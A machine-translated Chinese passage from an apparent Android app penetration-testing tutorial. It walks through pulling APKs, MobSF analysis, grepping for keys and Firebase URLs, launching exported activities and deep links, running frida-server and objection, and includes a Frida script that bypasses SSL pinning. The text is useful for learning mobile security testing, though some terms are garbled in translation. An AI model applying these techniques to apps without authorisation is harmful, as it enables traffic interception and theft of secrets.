href="https://www.genymotion.com/download/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> genymotion </strong> </a>)或Android仿真器，或者使用usb连接您的设备。</li><li id="0cba" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">首先，你需要将你的Android设备连接到你想要代理的电脑上。</li><li id="9b0d" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">接下来，您需要使用adb reverse设置一个反向端口，从您的手机转发到您的电脑。</li><li id="d4e1" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">这将把你手机上任何试图连接到localhost:8123的东西转发到连接的计算机上。</li></ul><p id="959f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">root@kali:~$ adb reverse tcp:8123 tcp:8123</code></p><ul class=""><li id="bd54" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">使用反向正向设置，您将需要设置Android代理设置。</li><li id="694d" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">为此，请转到您的网络连接，编辑连接，并显示高级选项。</li></ul><div class="nv nw gp gr nx ny"><a href="https://www.doyler.net/security-not-included/proxy-android-apps-through-burp" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">通过移动评估Burp代理Android应用| doyler.net</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">我不得不多次通过Burp代理Android应用程序，我想分享一下这有多简单…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">www.doyler.net</p></div></div></div></a></div><p id="73d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae mw" href="https://blog.jamie.holdings/2018/09/05/bypass-certificate-pinning-on-android/" rel="noopener ugc nofollow" target="_blank">https://blog . Jamie . holdings/2018/09/05/bypass-certificate-pinning-on-Android</a></p><p id="1a84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行以下命令，检查您是否能看到该设备:</p><p id="85b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">#亚行设备</p><p id="50ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">拉APP做静态分析</strong></p><p id="88ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">adb shell pm list packages</code></p><ul class=""><li id="bb4c" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">浏览软件包名称列表，并尝试找到有问题的应用程序和包名称之间的匹配项。</li><li id="363f" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">这通常很容易，但请注意，包名可以与应用程序名完全无关。如果您无法从软件包名称列表中识别该应用程序，请尝试使用浏览器在Google Play中查找该应用程序。Google Play中应用程序的URL包含包名。</li><li id="a10f" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">获取所需包的APK文件的完整路径名。</li></ul><p id="b7ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">adb shell pm path com.example.someapp</code></p><p id="f4aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出如下所示:package:/data/app/com . example . some app-2 . apk</p><p id="e88a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">adb pull /data/app/com.example.someapp-2.apk</code></p><ul class=""><li id="df7f" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">您可以使用-f选项将上述两个命令合并为一个命令(显示关联的文件，只需在此之后拉动文件):<br/>` ADB shell pm list packages-f | grep some app<br/>-&gt;package:/data/app/com . example . some app-2/base . apk = com . example . some app '</li><li id="16d9" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">顺便说一下，快速找到相关包的一个有用技巧是启动应用程序，并使用以下命令找到显示的活动:</li></ul><p id="dbcc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">adb shell dumpsys activity top | grep ACTIVITY</code></p><p id="0ff8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">-&gt; ACTIVITY com.example.someapp/.app.HomeActivity 2dbf6e2 pid=18453</code></p><ul class=""><li id="7353" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">一旦你通过上述方式或<a class="ae mw" href="https://apkcombo.com/en-in/" rel="noopener ugc nofollow" target="_blank">直接下载</a>获得应用程序，你就可以使用<a class="ae mw" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" rel="noopener ugc nofollow" target="_blank"> MobSF </a>开始应用程序的静态分析</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="d90d" class="lu lv iq lp b gy lw lx l ly lz"># docker pull opensecurity/mobile-security-framework-mobsf <br/># docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span></pre><h1 id="db23" class="nb lv iq bd ma nc nd ne md nf ng nh mg ni nj nk mj nl nm nn mm no np nq mp nr bi translated">静态分析</h1><ul class=""><li id="f848" class="kx ky iq jp b jq mr ju ms jy ns kc nt kg nu kk lc ld le lf bi translated">一旦Mobsf启动并运行，您可以进入<em class="lg"> localhost:8000 </em>并在其中放下/打开您的apk，它会解压缩apk，为您获取Java源代码并在静态分析后给您报告。</li><li id="528b" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">您甚至可以保存来自MobSF UI本身的java源代码，然后进行grep处理或手工分析</li></ul><p id="b242" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">在反编译的APK中，你窥探到了哪些特定的字符串/键/敏感信息？</strong></p><ol class=""><li id="deba" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk op ld le lf bi translated">我搜索deeplink端点通常是“customhost://”,所以搜索“://”经常会返回有趣的东西。也云API密钥，并利用awscli的关键。<br/> "grep -RP '(？&lt;！[A-Za-z0–9/+=])[A-Za-z0–9/+=]{ 40 }(？！[A-Za-z0–9/+=])' * '。</li><li id="86ed" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">也有一些特定的方法会导致不安全的实现，如shouldOverrideUrlLoading、shouldInterceptRequest、onDownloadStart、FirebaseDatabase.getInstance()和setJavaScriptEnabled(true)。</li><li id="b802" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">最后为导出的组件解析AndroidManifest.xml。exported="true "</li><li id="d4b0" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">查找敏感数据(如机密、S3桶URL、apikey、不记名令牌、auth令牌、第三方服务的硬编码凭据、密码、用户、用户名、git、db、数据库、api密钥、令牌、auth、http和其他协议。)在目录(res →value)下的AndroidManifest.xml或strings.xml中。</li><li id="1efa" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">特别注意<strong class="jp ir">firebase URL</strong>并检查它是否配置错误</li></ol><ul class=""><li id="adf2" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">复制url并追加/。json并在浏览器中打开它。如果响应不是“拒绝许可”,那么它可能是一个有效的bug。想要进一步了解，请阅读这个<a class="ae mw" href="https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/" rel="noopener ugc nofollow" target="_blank">博客</a>。</li><li id="c99e" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">MobSF还提取所有的字符串并显示在用户界面上，这样你也可以在用户界面上搜索相同的字符串。</li></ul><p id="ead0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">导出的活动</strong>:检查清单中的导出活动，因为这可能很危险。</p><ul class=""><li id="23b4" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">导出活动时，您可以从外部应用程序调用其屏幕。</li><li id="2c57" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">因此，如果带有<strong class="jp ir">敏感信息</strong>的活动被<strong class="jp ir">导出</strong>，您可以<strong class="jp ir">绕过</strong>认证<strong class="jp ir">机制</strong>来访问它。</li><li id="16c4" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">检查导出的activity类的源代码，查看activity是否接受用户提供的意图数据。你可以从清单文件中得到类名，在<strong class="jp ir">Android:name</strong>= "<strong class="jp ir">class name here</strong>下提到</li></ul><p id="b9bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以从adb启动导出的活动:</p><ul class=""><li id="8e5f" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">包名是com.sample.test</li><li id="a823" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">导出的ActivityName是com.sample.test.MainActivity</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="31cd" class="lu lv iq lp b gy lw lx l ly lz">adb shell am start -n &lt;package_name&gt;/&lt;activity_name&gt;<br/>adb shell am start -n com.sample.test/com.sample.test.MainActivity</span></pre><p id="4ace" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">内容提供者</strong>:如果一个导出的提供者被暴露，你可以访问/修改感兴趣的信息。</p><p id="54f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">暴露的服务</strong>:根据服务在内部做什么，漏洞可能会被利用。</p><ul class=""><li id="6eb6" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">如果一个应用程序正在导出一些服务，你应该<strong class="jp ir">检查</strong>代码<strong class="jp ir">以了解它在做什么</strong></li></ul><p id="963b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">广播接收器:</strong>广播接收器将等待一种类型的消息。取决于接收者如何处理消息，它可能是易受攻击的。</p><p id="9f5e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> URL scheme </strong>:读取管理模式的活动代码，寻找管理用户输入的漏洞。</p><ul class=""><li id="c6e8" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">您可以使用<strong class="jp ir"> adb </strong>打开一个已声明的<strong class="jp ir">方案</strong>:</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="6b1d" class="lu lv iq lp b gy lw lx l ly lz">adb shell am start -a android.intent.action.VIEW -d "scheme://hostname/path?param=value" [your.package.name]</span></pre><ul class=""><li id="fdee" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">或者一个<strong class="jp ir">浏览器:</strong></li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="a48e" class="lu lv iq lp b gy lw lx l ly lz">&lt;a href=”scheme://hostname/path?param=value”&gt;Click me&lt;/a&gt;</span><span id="37d0" class="lu lv iq lp b gy na lx l ly lz">&lt;! — fallback in your url you could try the intent url →</span><span id="6574" class="lu lv iq lp b gy na lx l ly lz">&lt;a href=”intent://hostname#Intent;scheme=scheme;package=your.package.name;S.browser_fallback_url=http%3A%2F%2Fwww.example.com;end"&gt;with alternative&lt;/a&gt;</span></pre><h2 id="b628" class="lu lv iq bd ma mb mc dn md me mf dp mg jy mh mi mj kc mk ml mm kg mn mo mp mq bi translated">其他有趣的功能</h2><ul class=""><li id="da8b" class="kx ky iq jp b jq mr ju ms jy ns kc nt kg nu kk lc ld le lf bi translated"><strong class="jp ir">代码执行</strong> : <code class="fe lm ln lo lp b">Runtime.exec(), ProcessBuilder(), native code:system()</code></li><li id="7768" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated"><strong class="jp ir">发送短信</strong> : <code class="fe lm ln lo lp b">sendTextMessage, sendMultipartTestMessage</code></li><li id="e055" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated"><strong class="jp ir">本机函数</strong>声明为<code class="fe lm ln lo lp b">native</code> : <code class="fe lm ln lo lp b">public native, System.loadLibrary, System.load</code></li><li id="9fc0" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">执行一些操作并检查<strong class="jp ir">日志目录</strong>是否有任何敏感信息泄漏。</li></ul><h2 id="96fa" class="lu lv iq bd ma mb mc dn md me mf dp mg jy mh mi mj kc mk ml mm kg mn mo mp mq bi translated">SQLite数据库:</h2><p id="f6be" class="pw-post-body-paragraph jn jo iq jp b jq mr js jt ju ms jw jx jy mt ka kb kc mu ke kf kg mv ki kj kk ij bi translated">大多数应用程序使用<strong class="jp ir">内部SQLite数据库</strong>来保存信息。在分析过程中，查看<strong class="jp ir">创建的<strong class="jp ir">数据库</strong>，保存的<strong class="jp ir">表</strong>和<strong class="jp ir">列</strong>的名称以及所有<strong class="jp ir">数据</strong>，因为您可以找到<strong class="jp ir">敏感信息</strong>(这可能是一个漏洞)。数据库应该像<code class="fe lm ln lo lp b">/data/data/com.sample.app/databases</code>一样位于<code class="fe lm ln lo lp b">/data/data/sample_package/databases</code></strong></p><p id="661c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果数据库保存了机密信息并且被加密了，但是你可以在应用程序中找到密码，这仍然是一个漏洞。</p><p id="332c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lm ln lo lp b">.tables</code>枚举表，使用<code class="fe lm ln lo lp b">.schema &lt;table_name&gt;</code>枚举表的列</p><p id="b5ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">弗里达</p><ul class=""><li id="ff1c" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">我们需要一个程序来动态分析正在运行的应用程序，我推荐的是Frida。</li><li id="1434" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">因此，如果尚未安装Frida，让我们安装它:</li></ul><p id="193f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">pip install frida-tools</code></p><p id="cdf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">将frida-server安装到设备上。</strong></p><ul class=""><li id="ecb0" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">从下载最新的<a class="ae mw" href="https://github.com/frida/frida/releases" rel="noopener ugc nofollow" target="_blank"> frida-server </a>，并根据您的设备选择正确的架构。<br/> -我用Pixel 3，架构是arm64但是avd/emulator会有x86 arch，所以下载x86版本的frida-server。</li><li id="e831" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">您可以检查CPU类型</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="b0a2" class="lu lv iq lp b gy lw lx l ly lz"># adb shell getprop ro.product.cpu.abi<br/>arm64-v8a<br/></span></pre><p id="94b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">下载合适的frida服务器</strong></p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="4c87" class="lu lv iq lp b gy lw lx l ly lz">wget <a class="ae mw" href="https://github.com/frida/frida/releases/download/11.0.3/frida-server-11.0.3-android-arm64.xz`" rel="noopener ugc nofollow" target="_blank">https://github.com/frida/frida/releases/download/11.0.3/frida-server-11.0.3-android-arm64.xz</a> (For ARM64) (as I use device)</span></pre><ul class=""><li id="45b6" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">提取存档文件</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="a05f" class="lu lv iq lp b gy lw lx l ly lz">unxz frida-server-11.0.3-android-arm64.xz</span></pre><ul class=""><li id="5abf" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">重命名为frida-server</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="15cb" class="lu lv iq lp b gy lw lx l ly lz">mv frida-server-11.0.3-android-arm64 frida-server</span></pre><ul class=""><li id="e61c" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">现在我们需要将frida服务器转移到设备上。</li><li id="aff5" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">为此，我们需要利用亚行</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="4633" class="lu lv iq lp b gy lw lx l ly lz">adb push frida-server /data/local/tmp</span></pre><ul class=""><li id="e3ac" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">更改文件的权限，以便我们可以执行它</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="6648" class="lu lv iq lp b gy lw lx l ly lz">adb shell chmod 755 /data/local/tmp/frida-server</span></pre><ul class=""><li id="c8c8" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">现在我们可以运行frida-server了</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="7fff" class="lu lv iq lp b gy lw lx l ly lz">adb shell “/data/local/tmp/frida-server &amp;”</span></pre><ul class=""><li id="2b66" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">通过列出设备上安装的程序来验证frida-server是否工作</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="ef80" class="lu lv iq lp b gy lw lx l ly lz">frida-ps -Uai</span></pre><ul class=""><li id="8601" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">当设备通过USB连接时，或者在本例中是android虚拟设备时，使用-U参数。</li><li id="ba60" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">在主机系统上</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="716c" class="lu lv iq lp b gy lw lx l ly lz">frida-ps -Uai | findstr tata        (searching for tatacliq app)</span></pre><p id="9b34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">非根设备</strong></p><ul class=""><li id="aca6" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">这个方法会修改一个apk，用frida-gadget打补丁。这意味着Objection将尝试在主活动中添加对frida-gadget库的新调用，并将frida-gadget注入apk中的lib文件夹。</li><li id="b5c1" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">异议并不总是能成功修补apk，所以不要相信它每次都能成功。</li></ul><p id="c1bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">带异议修补apk</strong></p><ul class=""><li id="671a" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">我们需要指定我们希望用frida-gadget为哪个架构修补apk。</li><li id="63aa" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">众所周知，android可以运行x86(例如:模拟器)或arm64(类似移动设备)</li><li id="4f25" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">您可以使用-a选项来指定正确的拱门</li><li id="087b" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">如果您指定-a arm，您将看到由objection支持的体系结构，然后您可以通过正确的arch。</li><li id="47a2" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">如上所述，我的arch是arm64-v8a，因此我的命令是:</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="017b" class="lu lv iq lp b gy lw lx l ly lz">objection patchapk -s app.name.apk -a arm64-v8a</span></pre><ul class=""><li id="84de" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">当修补完成时，文件将在文件名中有异议</li><li id="0591" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">如果修补成功，将修补的apk安装到设备上</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="5b25" class="lu lv iq lp b gy lw lx l ly lz">adb install app.name.objection.apk</span></pre><p id="17f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者将apk推送到设备并手动安装</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="3a3f" class="lu lv iq lp b gy lw lx l ly lz">adb push com.app.name.objection.apk /sdcard/Download</span></pre><p id="0e7d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">运行修改后的app </strong></p><ul class=""><li id="a138" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">一旦你运行你刚才安装的异议注入应用程序，你会看到一个黑屏，这是因为应用程序注入了frida小工具，并等待frida客户端连接到它。</li><li id="cce5" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">注入流程，开始探索app。</li><li id="3cf6" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">使用异议:</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="b955" class="lu lv iq lp b gy lw lx l ly lz">objection --gadget “com.app.name” explore -q</span></pre><p id="a311" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者使用frida:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="eb09" class="lu lv iq lp b gy lw lx l ly lz">frida-ps -Uai</span></pre><p id="3236" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="e2b1" class="lu lv iq lp b gy lw lx l ly lz">frida -U -n &lt;name_of_the_gadget&gt;</span></pre><p id="4c46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">打补丁失败，根设备</strong></p><ul class=""><li id="5d65" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">如果异议未能修补apk，如果您有根设备，您仍然可以使用异议。</li><li id="6204" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">这是因为使用了frida-server而不是frida-gadget。</li><li id="5dc2" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">所以在你的设备上启动frida-server</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="9e11" class="lu lv iq lp b gy lw lx l ly lz">adb shell “/data/local/tmp/frida-server &amp;”</span></pre><ul class=""><li id="b216" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">然后你可以从应用名称开始反对</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="b64c" class="lu lv iq lp b gy lw lx l ly lz">objection --gadget “com.app.name” explore -q</span></pre><p id="92c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">禁用sslpinning </strong></p><ul class=""><li id="10f0" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">一些应用程序使用sslpinning来防止网络连接被监听，但这可以通过反对来绕过。</li><li id="8bf5" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">如上运行objection，并在objection终端中运行以下命令来禁用sslpinning:</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="62a8" class="lu lv iq lp b gy lw lx l ly lz">android sslpinning disable</span></pre><p id="9486" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您也可以尝试使用frida禁用<strong class="jp ir"> ssl固定</strong>:</p><ul class=""><li id="eebc" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">创建一个. js文件来绕过ssl-pinning</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="30e3" class="lu lv iq lp b gy lw lx l ly lz">Java.perform(function() {<br/>var array_list = Java.use(“java.util.ArrayList”);<br/>var ApiClient = Java.use(‘com.android.org.conscrypt.TrustManagerImpl’);<br/>ApiClient.checkTrustedRecursive.implementation = function(a1, a2, a3, a4, a5, a6) {<br/>console.log(‘Bypassing SSL Pinning’);<br/>var k = array_list.$new();return k;<br/>}<br/>}, 0);</span></pre><ul class=""><li id="702c" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">如上所述，通过在android设备上运行frida服务器来获取包名，然后在您的linux/windows主机上运行“<strong class="jp ir"> frida-ps -U </strong>”。</li><li id="61ba" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">运行以下命令以绕过应用上的SSL锁定:</li></ul><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="b25e" class="lu lv iq lp b gy lw lx l ly lz">frida -U -f &lt;com.package_name&gt; -l bypass-ssl.js — no-pause</span></pre><p id="87df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">— — — — — — — — — — — — — — — — — — — — — — — — — -</p><p id="5974" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">静态/动态分析</strong></p><p id="9f1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看看可以执行系统命令的API调用，例如:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="26d3" class="lu lv iq lp b gy lw lx l ly lz">Runtime.exec()<br/>ProcessBuilder()<br/>system()</span></pre><h2 id="f482" class="lu lv iq bd ma mb mc dn md me mf dp mg jy mh mi mj kc mk ml mm kg mn mo mp mq bi translated">网络视图</h2><ul class=""><li id="144a" class="kx ky iq jp b jq mr ju ms jy ns kc nt kg nu kk lc ld le lf bi translated">用于显示网页</li><li id="f1fd" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">你只需要<code class="fe lm ln lo lp b">android.permission.INTERNET</code></li><li id="cc8f" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">寻找<code class="fe lm ln lo lp b">setJavaScriptEnabled(true);</code></li><li id="bdc8" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">默认情况下，JavaScript在WebView中是禁用的</li></ul><h1 id="3837" class="nb lv iq bd ma nc nd ne md nf ng nh mg ni nj nk mj nl nm nn mm no np nq mp nr bi translated">拉APK的脚本(摘自b3nac RedTeamVillage视频)</h1><p id="d168" class="pw-post-body-paragraph jn jo iq jp b jq mr js jt ju ms jw jx jy mt ka kb kc mu ke kf kg mv ki kj kk ij bi translated"><code class="fe lm ln lo lp b">autoapk.sh</code>:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="eed2" class="lu lv iq lp b gy lw lx l ly lz">#!/bin/bash</span><span id="d0b3" class="lu lv iq lp b 